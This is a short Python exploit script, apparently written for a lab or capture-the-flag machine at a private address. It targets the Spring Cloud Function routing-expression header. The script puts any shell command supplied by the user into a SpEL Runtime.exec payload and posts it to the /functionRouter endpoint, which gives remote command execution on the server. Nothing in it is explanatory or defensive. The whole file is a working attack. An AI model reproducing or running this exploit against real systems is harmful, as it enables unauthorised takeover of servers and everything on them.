import requests
import argparse
Url="http://10.10.11.204:8080/functionRouter" 

parser = argparse.ArgumentParser()
parser.add_argument('cmd', help='What Command to Execute :')
args = parser.parse_args()

payload=f'T(java.lang.Runtime).getRuntime().exec("{args.cmd}")'
headers={ 
"spring.cloud.function.routing-expression":payload,
"Host": "10.10.11.204:8080",
"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
"Accept": "*/*",
"Accept-Language": "en-US,en;q=0.5",
"Content-Type": "application/x-www-form-urlencoded",
"Connection": "close",
}

data={"."}

proxies={ 
    "http": "http://127.0.0.1:8585"
}

response= requests.post(Url, headers=headers, data=data, proxies=proxies)






